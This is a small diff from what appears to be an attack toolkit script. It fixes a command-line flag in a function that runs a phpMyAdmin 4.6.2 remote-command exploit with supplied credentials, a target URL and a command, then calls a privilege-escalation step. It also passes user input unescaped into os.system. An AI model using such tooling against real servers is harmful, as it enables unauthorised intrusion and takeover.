@@ -240,7 +240,7 @@ def run_phpmyadmin_462_exploit():
     command=input("Enter command to execute (e.g., whoami): ")
 
     # Running the exploit with provided inputs
-    os.system(f"python phpmyadmin-4.6.2-exploit.py -u {username} -pw {password} {fullurl} -c \"{command}\"")
+    os.system(f"python phpmyadmin-4.6.2-exploit.py -u {username} -p {password} {fullurl} -c \"{command}\"")
     privilege_escalation()
 
 def install_tools():
